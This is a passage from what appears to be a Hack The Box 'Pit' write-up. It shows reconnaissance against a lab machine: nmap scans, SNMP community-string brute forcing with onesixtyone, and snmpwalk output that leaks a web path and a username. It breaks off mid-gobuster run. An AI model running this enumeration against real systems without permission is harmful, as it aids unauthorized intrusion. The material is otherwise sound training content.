    <pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@kali «pit» «10.10.14.49» 
</span></span><span class="line"><span class="cl">$ <span class="nb">echo</span> <span class="s1">&#39;10.10.10.241 dms-pit.htb pit.htb&#39;</span> &gt;&gt; /etc/hosts</span></span></code></pre>
</figure><h4 id="udp">UDP</h4>
<p>For UDP ports, <code>nmap</code> discovers an SNMP server on port 161 and reveals a domain name <code>pit.htb</code>.</p>
<figure class="highlight">
    <pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@kali «pit» «10.10.14.49» 
</span></span><span class="line"><span class="cl">$ nmap -sU -sV -n --top-ports <span class="m">20</span> -oA nmap/10-udp-top20-pit 10.10.10.241
</span></span><span class="line"><span class="cl">Starting Nmap 7.80 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2021-05-20 11:18 EDT
</span></span><span class="line"><span class="cl">Nmap scan report <span class="k">for</span> 10.10.10.241
</span></span><span class="line"><span class="cl">Host is up <span class="o">(</span>0.074s latency<span class="o">)</span>.
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">PORT      STATE         SERVICE      VERSION
</span></span><span class="line"><span class="cl">53/udp    open<span class="p">|</span>filtered domain
</span></span><span class="line"><span class="cl">67/udp    open<span class="p">|</span>filtered dhcps
</span></span><span class="line"><span class="cl">68/udp    filtered      dhcpc
</span></span><span class="line"><span class="cl">69/udp    open<span class="p">|</span>filtered tftp
</span></span><span class="line"><span class="cl">123/udp   open<span class="p">|</span>filtered ntp
</span></span><span class="line"><span class="cl">135/udp   open<span class="p">|</span>filtered msrpc
</span></span><span class="line"><span class="cl">137/udp   open<span class="p">|</span>filtered netbios-ns
</span></span><span class="line"><span class="cl">138/udp   filtered      netbios-dgm
</span></span><span class="line"><span class="cl">139/udp   open<span class="p">|</span>filtered netbios-ssn
</span></span><span class="line"><span class="cl">161/udp   open          snmp         SNMPv1 server<span class="p">;</span> net-snmp SNMPv3 server <span class="o">(</span>public<span class="o">)</span>
</span></span><span class="line"><span class="cl">162/udp   open<span class="p">|</span>filtered snmptrap
</span></span><span class="line"><span class="cl">445/udp   filtered      microsoft-ds
</span></span><span class="line"><span class="cl">500/udp   open<span class="p">|</span>filtered isakmp
</span></span><span class="line"><span class="cl">514/udp   filtered      syslog
</span></span><span class="line"><span class="cl">520/udp   open<span class="p">|</span>filtered route
</span></span><span class="line"><span class="cl">631/udp   open<span class="p">|</span>filtered ipp
</span></span><span class="line"><span class="cl">1434/udp  open<span class="p">|</span>filtered ms-sql-m
</span></span><span class="line"><span class="cl">1900/udp  filtered      upnp
</span></span><span class="line"><span class="cl">4500/udp  open<span class="p">|</span>filtered nat-t-ike
</span></span><span class="line"><span class="cl">49152/udp open<span class="p">|</span>filtered unknown
</span></span><span class="line"><span class="cl">Service Info: Host: pit.htb
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
</span></span><span class="line"><span class="cl">Nmap <span class="k">done</span>: <span class="m">1</span> IP address <span class="o">(</span><span class="m">1</span> host up<span class="o">)</span> scanned in 18.21 seconds</span></span></code></pre>
</figure><h3 id="poking-the-websites">Poking the websites</h3>
<p>For HTTP, it seems only <code>dms-pit.htb</code> that serves different content.</p>
<figure class="highlight">
    <pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@kali «pit» «10.10.14.49» 
</span></span><span class="line"><span class="cl">$ curl -s http://10.10.10.241/ <span class="p">|</span> wc -c                                 
</span></span><span class="line"><span class="cl"><span class="m">4057</span>
</span></span><span class="line"><span class="cl">→ root@kali «pit» «10.10.14.49» 
</span></span><span class="line"><span class="cl">$ curl -s http://pit.htb/ <span class="p">|</span> wc -c
</span></span><span class="line"><span class="cl"><span class="m">4057</span>
</span></span><span class="line"><span class="cl">→ root@kali «pit» «10.10.14.49» 
</span></span><span class="line"><span class="cl">$ curl -s http://dms-pit.htb/ <span class="p">|</span> wc -c
</span></span><span class="line"><span class="cl"><span class="m">169</span></span></span></code></pre>
</figure><p>For HTTPS on port 9090, it&rsquo;s all the same site.</p>
<figure class="highlight">
    <pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@kali «pit» «10.10.14.49» 
</span></span><span class="line"><span class="cl">$ curl -s -k https://10.10.10.241:9090/ <span class="p">|</span> wc -c
</span></span><span class="line"><span class="cl"><span class="m">43548</span>
</span></span><span class="line"><span class="cl">→ root@kali «pit» «10.10.14.49» 
</span></span><span class="line"><span class="cl">$ curl -s -k https://pit.htb:9090/ <span class="p">|</span> wc -c
</span></span><span class="line"><span class="cl"><span class="m">43548</span>
</span></span><span class="line"><span class="cl">→ root@kali «pit» «10.10.14.49» 
</span></span><span class="line"><span class="cl">$ curl -s -k https://dms-pit.htb:9090/ <span class="p">|</span> wc -c
</span></span><span class="line"><span class="cl"><span class="m">43548</span></span></span></code></pre>
</figure><h2 id="enumeration">Enumeration</h2>
<h3 id="tcp-80---website">TCP 80 - Website</h3>
<p>On port 80, a NGINX default web page for REHL is shown here.</p>
<p><div class="img-container"><img src="imgs/image-20210520224354684.png" alt="image-20210520224354684"  /></div>
</p>
<p>Running <code>gobuster</code> against this site doesn&rsquo;t really find something useful, and I couldn&rsquo;t find a critical vulnerability on <code>nginx 1.14.1</code>.</p>
<h3 id="tcp-80---dms-pithtb">TCP 80 - dms-pit.htb</h3>
<p>Heading to <code>dms-pit.htb</code> on port 80 shows a 403 forbidden error message.</p>
<p><div class="img-container"><img src="imgs/image-20210520224457026.png" alt="image-20210520224457026"  /></div>
</p>
<p>For this site, <code>gobuster</code> actually found some files, but all of them returned with 403 status.</p>
<h3 id="tcp-9090---website-https">TCP 9090 - Website (HTTPS)</h3>
<p>On port 9090, there is a login page.</p>
<p><div class="img-container"><img src="imgs/image-20210520225003343.png" alt="image-20210520225003343"  /></div>
</p>
<p>This page was identified as an instance of <a href="https://cockpit-project.org/."target="_blank" rel="noopener noreferrer"
>Cockpit</a>, a web-based interface for system administration.</p>
<h4 id="searchsploit">Searchsploit</h4>
<p>There is a security issue on GitHub which talks about SSRF:</p>
<ul>
<li><a href="https://github.com/cockpit-project/cockpit/issues/15077"target="_blank" rel="noopener noreferrer"
>https://github.com/cockpit-project/cockpit/issues/15077</a></li>
</ul>
<p>The researcher disclosed the issue in his blog.</p>
<ul>
<li><a href="https://docs.unsafe-inline.com/0day/cokpit-version-234-server-side-request-forgery-cve-2020-35850"target="_blank" rel="noopener noreferrer"
>https://docs.unsafe-inline.com/0day/cokpit-version-234-server-side-request-forgery-cve-2020-35850</a></li>
</ul>
<p>The researcher also provides a PoC, but it requires an account, so I will move on to the next service.</p>
<h3 id="udp-161---snmp">UDP 161 - SNMP</h3>
<p>From what <code>nmap</code> gave, I assume that this machine supports SNMPv1-SNMPv3. Based on what I read on <a href="https://book.hacktricks.xyz/pentesting/pentesting-snmp"target="_blank" rel="noopener noreferrer"
>HackTricks</a>, to enumerate SNMP version 1/2c, I need to know the community string name, and there are two types of it: <code>public</code> and <code>private</code>.</p>
<p>The <code>public</code> community string normally grants read access, however <code>private</code> may grant you read/write access, even leading to <a href="https://book.hacktricks.xyz/pentesting/pentesting-snmp/snmp-rce"target="_blank" rel="noopener noreferrer"
>remote code execution</a>.</p>
<p>For SNMP version 1 and 2c, it is possible to identify a valid community string based on the server&rsquo;s response with a dictionary attack (brute) . In Kali, there is a preinstalled tool for this, which I will use called <code>onesixtyone</code>. I will run it and save the output to a file.</p>
<figure class="highlight">
    <pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@kali «pit» «10.10.14.49»
</span></span><span class="line"><span class="cl">$ onesixtyone -c /opt/SecLists/Discovery/SNMP/snmp.txt 10.10.10.241 &gt; snmp-enum/brute-community-strings</span></span></code></pre>
</figure><p>The attack reveals that <strong>public</strong> is a valid community string.</p>
<figure class="highlight">
    <pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@kali «pit» «10.10.14.49»
</span></span><span class="line"><span class="cl">$ cat snmp-enum/brute-community-strings
</span></span><span class="line"><span class="cl">Scanning <span class="m">1</span> hosts, <span class="m">3220</span> communities
</span></span><span class="line"><span class="cl">10.10.10.241 <span class="o">[</span>public<span class="o">]</span> Linux pit.htb 4.18.0-240.22.1.el8_3.x86_64 <span class="c1">#1 SMP Thu Apr 8 19:01:30 UTC 2021 x86_64</span>
</span></span><span class="line"><span class="cl">10.10.10.241 <span class="o">[</span>public<span class="o">]</span> Linux pit.htb 4.18.0-240.22.1.el8_3.x86_64 <span class="c1">#1 SMP Thu Apr 8 19:01:30 UTC 2021 x86_64</span></span></span></code></pre>
</figure><p>Now to enumerate SNMP, I will use another preinstalled tool called <code>snmpwalk</code>. Using this tool will return a list of <a href="https://book.hacktricks.xyz/pentesting/pentesting-snmp#oids"target="_blank" rel="noopener noreferrer"
>OID (Objects Identifiers)</a> which consists a set of numbers separated by dot, so to translate these numbers into a bit meaningful, I will need <code>snmp-mibs-downloader</code>. I will install that with:</p>
<figure class="highlight">
    <pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@kali «pit» «10.10.14.49»
</span></span><span class="line"><span class="cl">$ apt-get install snmp-mibs-downloader</span></span></code></pre>
</figure><p>The general usage for <code>snmpwalk</code> is:</p>
<figure class="highlight">
    <pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">$ snmpwalk <span class="o">[</span>OPTIONS<span class="o">]</span> AGENT <span class="o">[</span>OID<span class="o">]</span></span></span></code></pre>
</figure><p>Actually, I did a lot of enumeration with SNMP, but because OID is a hierarchical structure, I found that it was easier to start from the Internet OID, which is <code>1.3.6.1</code>, so that it would  &ldquo;walk&rdquo; down to any readable OID branch, it is something like <code>1.3.6.1</code> -&gt; <code>1.3.6.1.1</code> (directory OID) -&gt; &hellip; -&gt;  <code>1.3.6.1.4</code> (private OID) -&gt; &hellip; -&gt; <code>1.3.6.1.X.X</code>.</p>
<p>I will run <code>snmpwalk</code> on that and save the output to <code>snmp-internet-1.3.6.1.out</code>.</p>
<figure class="highlight">
    <pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@kali «pit» «10.10.14.49»
</span></span><span class="line"><span class="cl">$ snmpwalk -v 2c -c public 10.10.10.241 internet &gt; snmp-internet-1.3.6.1.out</span></span></code></pre>
</figure><ul>
<li><code>-v</code> 2c: SNMP version 2c. SNMP version 1 and 2c sends data in clear-text while version 3 uses auth.</li>
<li><code>-c</code> public: community string</li>
<li><code>internet</code>: auto translated to 1.3.6.1 by <code>snmp-mibs-downloader</code></li>
</ul>
<p>I will filter the output with <code>hrSWRunParameters</code> (Host Resources Software Run Parameters), which might leak some sensitive information from the command line arguments of the current running processes, but it doesn&rsquo;t have any.</p>
<figure class="highlight">
    <pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@kali «pit» «10.10.14.49»
</span></span><span class="line"><span class="cl">$ cat snmp-enum/snmp-internet-1.3.6.1.out <span class="p">|</span> grep <span class="s2">&#34;hrSWRunParameters&#34;</span> <span class="p">|</span> grep STRING
</span></span><span class="line"><span class="cl">HOST-RESOURCES-MIB::hrSWRunParameters.1 <span class="o">=</span> STRING: <span class="s2">&#34;--switched-root --system --deserialize 17&#34;</span>
</span></span><span class="line"><span class="cl">HOST-RESOURCES-MIB::hrSWRunParameters.1000 <span class="o">=</span> STRING: <span class="s2">&#34;--system --address=systemd: --nofork --nopidfile --systemd-activation --syslog-only&#34;</span>
</span></span><span class="line"><span class="cl">HOST-RESOURCES-MIB::hrSWRunParameters.1001 <span class="o">=</span> STRING: <span class="s2">&#34;--foreground&#34;</span>
</span></span><span class="line"><span class="cl">HOST-RESOURCES-MIB::hrSWRunParameters.1002 <span class="o">=</span> STRING: <span class="s2">&#34;--no-debug&#34;</span>
</span></span><span class="line"><span class="cl">HOST-RESOURCES-MIB::hrSWRunParameters.1004 <span class="o">=</span> STRING: <span class="s2">&#34;-s&#34;</span>
</span></span><span class="line"><span class="cl">HOST-RESOURCES-MIB::hrSWRunParameters.1009 <span class="o">=</span> STRING: <span class="s2">&#34;-i --logger=files&#34;</span>
</span></span><span class="line"><span class="cl">HOST-RESOURCES-MIB::hrSWRunParameters.1011 <span class="o">=</span> STRING: <span class="s2">&#34;-f --fill-watermark=0&#34;</span>
</span></span><span class="line"><span class="cl">HOST-RESOURCES-MIB::hrSWRunParameters.1041 <span class="o">=</span> STRING: <span class="s2">&#34;--domain implicit_files --uid 0 --gid 0 --logger=files&#34;</span>
</span></span><span class="line"><span class="cl">HOST-RESOURCES-MIB::hrSWRunParameters.1051 <span class="o">=</span> STRING: <span class="s2">&#34;--uid 0 --gid 0 --logger=files&#34;</span>
</span></span><span class="line"><span class="cl">HOST-RESOURCES-MIB::hrSWRunParameters.1056 <span class="o">=</span> STRING: <span class="s2">&#34;-s /usr/sbin/firewalld --nofork --nopid&#34;</span>
</span></span><span class="line"><span class="cl">HOST-RESOURCES-MIB::hrSWRunParameters.1090 <span class="o">=</span> STRING: <span class="s2">&#34;--no-daemon&#34;</span>
</span></span><span class="line"><span class="cl">HOST-RESOURCES-MIB::hrSWRunParameters.1101 <span class="o">=</span> STRING: <span class="s2">&#34;-D -oCiphers=aes256-gcm@openssh.com,chacha20-poly1305@openssh.com,aes256-ctr,aes256-cbc,aes128-gcm@openssh.com,aes128-ctr,aes128&#34;</span>
</span></span><span class="line"><span class="cl">HOST-RESOURCES-MIB::hrSWRunParameters.1105 <span class="o">=</span> STRING: <span class="s2">&#34;-Es /usr/sbin/tuned -l -P&#34;</span>
</span></span><span class="line"><span class="cl">HOST-RESOURCES-MIB::hrSWRunParameters.1116 <span class="o">=</span> STRING: <span class="s2">&#34;-n&#34;</span>
</span></span><span class="line"><span class="cl">HOST-RESOURCES-MIB::hrSWRunParameters.1193 <span class="o">=</span> STRING: <span class="s2">&#34;-o -p -- \\u --noclear tty1 linux&#34;</span>
</span></span><span class="line"><span class="cl">HOST-RESOURCES-MIB::hrSWRunParameters.1208 <span class="o">=</span> STRING: <span class="s2">&#34;--basedir=/usr&#34;</span>
</span></span><span class="line"><span class="cl">HOST-RESOURCES-MIB::hrSWRunParameters.1479 <span class="o">=</span> STRING: <span class="s2">&#34;-n&#34;</span>
</span></span><span class="line"><span class="cl">HOST-RESOURCES-MIB::hrSWRunParameters.1481 <span class="o">=</span> STRING: <span class="s2">&#34;-LS0-6d -f&#34;</span>
</span></span><span class="line"><span class="cl">HOST-RESOURCES-MIB::hrSWRunParameters.10212 <span class="o">=</span> STRING: <span class="s2">&#34;-Es /usr/share/setroubleshoot/SetroubleshootFixit.py&#34;</span></span></span></code></pre>
</figure><p>If I examine the entire output carefully, the two most interesting information are:</p>
<ul>
<li>A web path <code>/var/www/html/seeddms51x/seeddms</code>, and</li>
<li>A potential username: <code>michelle</code></li>
</ul>
<figure class="highlight">
    <pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">UCD-SNMP-MIB::dskPath.2 <span class="o">=</span> STRING: /var/www/html/seeddms51x/seeddms
</span></span><span class="line"><span class="cl">UCD-SNMP-MIB::dskDevice.1 <span class="o">=</span> STRING: /dev/mapper/cl-root
</span></span><span class="line"><span class="cl">UCD-SNMP-MIB::dskDevice.2 <span class="o">=</span> STRING: /dev/mapper/cl-seeddms
</span></span><span class="line"><span class="cl">...<span class="o">[</span>SNIP<span class="o">]</span>...
</span></span><span class="line"><span class="cl">NET-SNMP-EXTEND-MIB::nsExtendNumEntries.0 <span class="o">=</span> INTEGER: <span class="m">1</span>
</span></span><span class="line"><span class="cl">NET-SNMP-EXTEND-MIB::nsExtendCommand.<span class="s2">&#34;monitoring&#34;</span> <span class="o">=</span> STRING: /usr/bin/monitor
</span></span><span class="line"><span class="cl">NET-SNMP-EXTEND-MIB::nsExtendArgs.<span class="s2">&#34;monitoring&#34;</span> <span class="o">=</span> STRING: 
</span></span><span class="line"><span class="cl">NET-SNMP-EXTEND-MIB::nsExtendInput.<span class="s2">&#34;monitoring&#34;</span> <span class="o">=</span> STRING: 
</span></span><span class="line"><span class="cl">NET-SNMP-EXTEND-MIB::nsExtendCacheTime.<span class="s2">&#34;monitoring&#34;</span> <span class="o">=</span> INTEGER: <span class="m">5</span>
</span></span><span class="line"><span class="cl">NET-SNMP-EXTEND-MIB::nsExtendExecType.<span class="s2">&#34;monitoring&#34;</span> <span class="o">=</span> INTEGER: exec<span class="o">(</span>1<span class="o">)</span>
</span></span><span class="line"><span class="cl">NET-SNMP-EXTEND-MIB::nsExtendRunType.<span class="s2">&#34;monitoring&#34;</span> <span class="o">=</span> INTEGER: run-on-read<span class="o">(</span>1<span class="o">)</span>
</span></span><span class="line"><span class="cl">NET-SNMP-EXTEND-MIB::nsExtendStorage.<span class="s2">&#34;monitoring&#34;</span> <span class="o">=</span> INTEGER: permanent<span class="o">(</span>4<span class="o">)</span>
</span></span><span class="line"><span class="cl">NET-SNMP-EXTEND-MIB::nsExtendStatus.<span class="s2">&#34;monitoring&#34;</span> <span class="o">=</span> INTEGER: active<span class="o">(</span>1<span class="o">)</span>
</span></span><span class="line"><span class="cl">NET-SNMP-EXTEND-MIB::nsExtendOutput1Line.<span class="s2">&#34;monitoring&#34;</span> <span class="o">=</span> STRING: Memory usage
</span></span><span class="line"><span class="cl">NET-SNMP-EXTEND-MIB::nsExtendOutputFull.<span class="s2">&#34;monitoring&#34;</span> <span class="o">=</span> STRING: Memory usage
</span></span><span class="line"><span class="cl">              total        used        free      shared  buff/cache   available
</span></span><span class="line"><span class="cl">Mem:          3.8Gi       415Mi       3.0Gi        16Mi       452Mi       3.2Gi
</span></span><span class="line"><span class="cl">Swap:         1.9Gi          0B       1.9Gi
</span></span><span class="line"><span class="cl">Database status
</span></span><span class="line"><span class="cl">OK - Connection to database successful.
</span></span><span class="line"><span class="cl">System release info
</span></span><span class="line"><span class="cl">CentOS Linux release 8.3.2011
</span></span><span class="line"><span class="cl">SELinux Settings
</span></span><span class="line"><span class="cl">user
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">                Labeling   MLS/       MLS/                          
</span></span><span class="line"><span class="cl">SELinux User    Prefix     MCS Level  MCS Range                      SELinux Roles
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">guest_u         user       s0         s0                             guest_r
</span></span><span class="line"><span class="cl">root            user       s0         s0-s0:c0.c1023                 staff_r sysadm_r system_r unconfined_r
</span></span><span class="line"><span class="cl">staff_u         user       s0         s0-s0:c0.c1023                 staff_r sysadm_r unconfined_r
</span></span><span class="line"><span class="cl">sysadm_u        user       s0         s0-s0:c0.c1023                 sysadm_r
</span></span><span class="line"><span class="cl">system_u        user       s0         s0-s0:c0.c1023                 system_r unconfined_r
</span></span><span class="line"><span class="cl">unconfined_u    user       s0         s0-s0:c0.c1023                 system_r unconfined_r
</span></span><span class="line"><span class="cl">user_u          user       s0         s0                             user_r
</span></span><span class="line"><span class="cl">xguest_u        user       s0         s0                             xguest_r
</span></span><span class="line"><span class="cl">login
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Login Name           SELinux User         MLS/MCS Range        Service
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">__default__          unconfined_u         s0-s0:c0.c1023       *
</span></span><span class="line"><span class="cl">michelle             user_u               s0                   *
</span></span><span class="line"><span class="cl">root                 unconfined_u         s0-s0:c0.c1023       *
</span></span><span class="line"><span class="cl">System uptime
</span></span><span class="line"><span class="cl"> 14:03:52 up 12:03,  <span class="m">0</span> users,  load average: 0.04, 0.01, 0.00
</span></span><span class="line"><span class="cl">NET-SNMP-EXTEND-MIB::nsExtendOutNumLines.<span class="s2">&#34;monitoring&#34;</span> <span class="o">=</span> INTEGER: <span class="m">31</span>
</span></span><span class="line"><span class="cl">NET-SNMP-EXTEND-MIB::nsExtendResult.<span class="s2">&#34;monitoring&#34;</span> <span class="o">=</span> INTEGER: <span class="m">0</span>
</span></span><span class="line"><span class="cl">NET-SNMP-EXTEND-MIB::nsExtendOutLine.<span class="s2">&#34;monitoring&#34;</span>.1 <span class="o">=</span> STRING: Memory usage
</span></span><span class="line"><span class="cl">NET-SNMP-EXTEND-MIB::nsExtendOutLine.<span class="s2">&#34;monitoring&#34;</span>.2 <span class="o">=</span> STRING:               total        used        free      shared  buff/cache   available
</span></span><span class="line"><span class="cl">NET-SNMP-EXTEND-MIB::nsExtendOutLine.<span class="s2">&#34;monitoring&#34;</span>.3 <span class="o">=</span> STRING: Mem:          3.8Gi       415Mi       3.0Gi        16Mi       452Mi       3.2Gi
</span></span><span class="line"><span class="cl">NET-SNMP-EXTEND-MIB::nsExtendOutLine.<span class="s2">&#34;monitoring&#34;</span>.4 <span class="o">=</span> STRING: Swap:         1.9Gi          0B       1.9Gi
</span></span><span class="line"><span class="cl">NET-SNMP-EXTEND-MIB::nsExtendOutLine.<span class="s2">&#34;monitoring&#34;</span>.5 <span class="o">=</span> STRING: Database status
</span></span><span class="line"><span class="cl">NET-SNMP-EXTEND-MIB::nsExtendOutLine.<span class="s2">&#34;monitoring&#34;</span>.6 <span class="o">=</span> STRING: OK - Connection to database successful.
</span></span><span class="line"><span class="cl">NET-SNMP-EXTEND-MIB::nsExtendOutLine.<span class="s2">&#34;monitoring&#34;</span>.7 <span class="o">=</span> STRING: System release info
</span></span><span class="line"><span class="cl">NET-SNMP-EXTEND-MIB::nsExtendOutLine.<span class="s2">&#34;monitoring&#34;</span>.8 <span class="o">=</span> STRING: CentOS Linux release 8.3.2011
</span></span><span class="line"><span class="cl">NET-SNMP-EXTEND-MIB::nsExtendOutLine.<span class="s2">&#34;monitoring&#34;</span>.9 <span class="o">=</span> STRING: SELinux Settings
</span></span><span class="line"><span class="cl">NET-SNMP-EXTEND-MIB::nsExtendOutLine.<span class="s2">&#34;monitoring&#34;</span>.10 <span class="o">=</span> STRING: user
</span></span><span class="line"><span class="cl">NET-SNMP-EXTEND-MIB::nsExtendOutLine.<span class="s2">&#34;monitoring&#34;</span>.11 <span class="o">=</span> STRING: 
</span></span><span class="line"><span class="cl">NET-SNMP-EXTEND-MIB::nsExtendOutLine.<span class="s2">&#34;monitoring&#34;</span>.12 <span class="o">=</span> STRING:                 Labeling   MLS/       MLS/                          
</span></span><span class="line"><span class="cl">NET-SNMP-EXTEND-MIB::nsExtendOutLine.<span class="s2">&#34;monitoring&#34;</span>.13 <span class="o">=</span> STRING: SELinux User    Prefix     MCS Level  MCS Range                      SELinux Roles
</span></span><span class="line"><span class="cl">NET-SNMP-EXTEND-MIB::nsExtendOutLine.<span class="s2">&#34;monitoring&#34;</span>.14 <span class="o">=</span> STRING: 
</span></span><span class="line"><span class="cl">NET-SNMP-EXTEND-MIB::nsExtendOutLine.<span class="s2">&#34;monitoring&#34;</span>.15 <span class="o">=</span> STRING: guest_u         user       s0         s0                             guest_r
</span></span><span class="line"><span class="cl">NET-SNMP-EXTEND-MIB::nsExtendOutLine.<span class="s2">&#34;monitoring&#34;</span>.16 <span class="o">=</span> STRING: root            user       s0         s0-s0:c0.c1023                 staff_r sysadm_r system_r unconfined_r
</span></span><span class="line"><span class="cl">NET-SNMP-EXTEND-MIB::nsExtendOutLine.<span class="s2">&#34;monitoring&#34;</span>.17 <span class="o">=</span> STRING: staff_u         user       s0         s0-s0:c0.c1023                 staff_r sysadm_r unconfined_r
</span></span><span class="line"><span class="cl">NET-SNMP-EXTEND-MIB::nsExtendOutLine.<span class="s2">&#34;monitoring&#34;</span>.18 <span class="o">=</span> STRING: sysadm_u        user       s0         s0-s0:c0.c1023                 sysadm_r
</span></span><span class="line"><span class="cl">NET-SNMP-EXTEND-MIB::nsExtendOutLine.<span class="s2">&#34;monitoring&#34;</span>.19 <span class="o">=</span> STRING: system_u        user       s0         s0-s0:c0.c1023                 system_r unconfined_r
</span></span><span class="line"><span class="cl">NET-SNMP-EXTEND-MIB::nsExtendOutLine.<span class="s2">&#34;monitoring&#34;</span>.20 <span class="o">=</span> STRING: unconfined_u    user       s0         s0-s0:c0.c1023                 system_r unconfined_r
</span></span><span class="line"><span class="cl">NET-SNMP-EXTEND-MIB::nsExtendOutLine.<span class="s2">&#34;monitoring&#34;</span>.21 <span class="o">=</span> STRING: user_u          user       s0         s0                             user_r
</span></span><span class="line"><span class="cl">NET-SNMP-EXTEND-MIB::nsExtendOutLine.<span class="s2">&#34;monitoring&#34;</span>.22 <span class="o">=</span> STRING: xguest_u        user       s0         s0                             xguest_r
</span></span><span class="line"><span class="cl">NET-SNMP-EXTEND-MIB::nsExtendOutLine.<span class="s2">&#34;monitoring&#34;</span>.23 <span class="o">=</span> STRING: login
</span></span><span class="line"><span class="cl">NET-SNMP-EXTEND-MIB::nsExtendOutLine.<span class="s2">&#34;monitoring&#34;</span>.24 <span class="o">=</span> STRING: 
</span></span><span class="line"><span class="cl">NET-SNMP-EXTEND-MIB::nsExtendOutLine.<span class="s2">&#34;monitoring&#34;</span>.25 <span class="o">=</span> STRING: Login Name           SELinux User         MLS/MCS Range        Service
</span></span><span class="line"><span class="cl">NET-SNMP-EXTEND-MIB::nsExtendOutLine.<span class="s2">&#34;monitoring&#34;</span>.26 <span class="o">=</span> STRING: 
</span></span><span class="line"><span class="cl">NET-SNMP-EXTEND-MIB::nsExtendOutLine.<span class="s2">&#34;monitoring&#34;</span>.27 <span class="o">=</span> STRING: __default__          unconfined_u         s0-s0:c0.c1023       *
</span></span><span class="line"><span class="cl">NET-SNMP-EXTEND-MIB::nsExtendOutLine.<span class="s2">&#34;monitoring&#34;</span>.28 <span class="o">=</span> STRING: michelle             user_u               s0                   *
</span></span><span class="line"><span class="cl">NET-SNMP-EXTEND-MIB::nsExtendOutLine.<span class="s2">&#34;monitoring&#34;</span>.29 <span class="o">=</span> STRING: root                 unconfined_u         s0-s0:c0.c1023       *
</span></span><span class="line"><span class="cl">NET-SNMP-EXTEND-MIB::nsExtendOutLine.<span class="s2">&#34;monitoring&#34;</span>.30 <span class="o">=</span> STRING: System uptime
</span></span><span class="line"><span class="cl">NET-SNMP-EXTEND-MIB::nsExtendOutLine.<span class="s2">&#34;monitoring&#34;</span>.31 <span class="o">=</span> STRING:  14:03:52 up 12:03,  <span class="m">0</span> users,  load average: 0.04, 0.01, 0.00
</span></span><span class="line"><span class="cl">NET-SNMP-EXTEND-MIB::nsExtendOutLine.<span class="s2">&#34;monitoring&#34;</span>.31 <span class="o">=</span> No more variables left in this MIB View <span class="o">(</span>It is past the end of the MIB tree<span class="o">)</span></span></span></code></pre>
</figure><p>I will also notice that some of the output lines starting with <code>NET-SNMP-EXTEND-MIB</code> are similar to the output from some Linux command utilities such as <code>uptime</code> and <code>free -h</code>.</p>
<h3 id="seeddms-tcp-80">SeedDMS (TCP 80)</h3>
<p>From the enumeration above, a web directory was revealed at <code>/var/www/html/seeddms51x/seeddms</code> by <code>snmpwalk</code>. Since the directory path contains a &ldquo;dms&rdquo; string, I tried to append the path name to <code>http://dms-pit.htb</code>.</p>
<p>And then when I enter <code>http://dms-pit.htb/seeddms51x/seeddms</code>, it redirects me to a login page.</p>
<p><div class="img-container"><img src="imgs/image-20210521014642036.png" alt="image-20210521014642036"  /></div>
</p>
<p>A quick search for &ldquo;SeedDMS&rdquo; on Google pops <a href="https://www.seeddms.org/index.php?id=2"target="_blank" rel="noopener noreferrer"
>this link</a>. It states that SeedDMS is:</p>
<blockquote>
<p>A free document management system with an easy to use web  based user interface for small and medium sized enterprises. It is based on PHP and MySQL or sqlite3 and runs on Linux, MacOS and Windows. Many  years of development has made it a mature, powerful and enterprise ready platform for sharing and storing documents.</p>
</blockquote>
<h4 id="gobuster">Gobuster</h4>
<p>This time <code>gobuster</code> reveals some accessible items.</p>
<figure class="highlight">
    <pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@kali «pit» «10.10.14.49»
</span></span><span class="line"><span class="cl">$ gobuster dir -u http://dms-pit.htb/seeddms51x/seeddms/ -x txt,php -w /opt/SecLists/Discovery/Web-Content/raft-medium-directories.txt -o gobuster/dms-pit.htb-seeddms-M-80 -t <span class="m">10</span> -b 403,404 -r
</span></span><span class="line"><span class="cl"><span class="o">===============================================================</span>
</span></span><span class="line"><span class="cl">Gobuster v3.1.0
</span></span><span class="line"><span class="cl">by OJ Reeves <span class="o">(</span>@TheColonial<span class="o">)</span> <span class="p">&amp;</span> Christian Mehlmauer <span class="o">(</span>@firefart<span class="o">)</span>
</span></span><span class="line"><span class="cl"><span class="o">===============================================================</span>
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Url:                     http://dms-pit.htb/seeddms51x/seeddms/
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Method:                  GET
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Threads:                 <span class="m">10</span>
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Wordlist:                /opt/SecLists/Discovery/Web-Content/raft-medium-directories.txt
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Negative Status codes:   403,404
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> User Agent:              gobuster/3.1.0
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Extensions:              txt,php
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Follow Redirect:         <span class="nb">true</span>
